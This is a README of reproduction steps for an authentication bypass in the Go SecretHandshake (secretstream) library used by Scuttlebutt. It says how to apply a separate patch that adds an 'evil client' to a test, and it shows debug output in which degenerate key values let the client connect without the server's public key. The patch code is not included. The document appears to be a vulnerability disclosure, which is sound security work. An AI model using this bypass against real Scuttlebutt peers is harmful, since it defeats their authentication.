# Reproduction Steps

The .patch file was produced with git to be applied Scuttelbutt's Go Implementation. 
The attack code is written in one of the test functions, the test spins up a server
and client and connects them over TCP on the local interface. The attack code modifies the 
client and is able to connect to the server without knowing the server's public key. 

Steps

 1) Firstly, ensure you have a working Go environment and Go path. 
 2) In your go path, git clone the Scuttlebutt SecretHandshake 
 [repo](https://github.com/cryptoscope/secretstream)
 3) Check you can build and test the package by issuing `go test`
 4) Apply the provided patch file using `git am --signoff < [PATCHFILEPATH]`
 5) Issue `go test` again. 
 6) You should see debug output similar to:

 ```
     Evil Client: Sent Client Challenge
     Evil Client: Verified Server Challenge
     Evil Client: Box Payload = 010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000 
     Evil Client: Sent Client Auth
     Server: Checking Client Auth
     Server: S_LTK and C_EPH = 0000000000000000000000000000000000000000000000000000000000000000 
     Server: Box Key = e0d57540ace06f738ffb905d72bbfb12fcc1913b60d28df393d156fc1cd9a9b7 
     Server: Opened Box From Client
     Server: Client Public = 0100000000000000000000000000000000000000000000000000000000000000
     Server: Client Sig = 01000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
     Made it to end of verification function
     LHS = 0100000000000000000000000000000000000000000000000000000000000000 
     RHS = 0100000000000000000000000000000000000000000000000000000000000000 
     Server: Verified Client Signature
     Evil Client: Opened Box From Server
     Evil Client: Finished Checking Server Accept (ignoring Signature)
     s.secret = 0000000000000000000000000000000000000000000000000000000000000000 
     s.localPublic = 0100000000000000000000000000000000000000000000000000000000000000 
     Evil Client connected WITHOUT knowing key! 
     panic: Fail in goroutine after TestNet has completed
 ```

 The final panic is an artifact of our modifications to the evil client and not otherwise an issue. Note that only the client code
 was changed in this attack and the client was not told the server's public key before connecting. It is probably most instructive to
 examine the diff to understand how the attack is performed.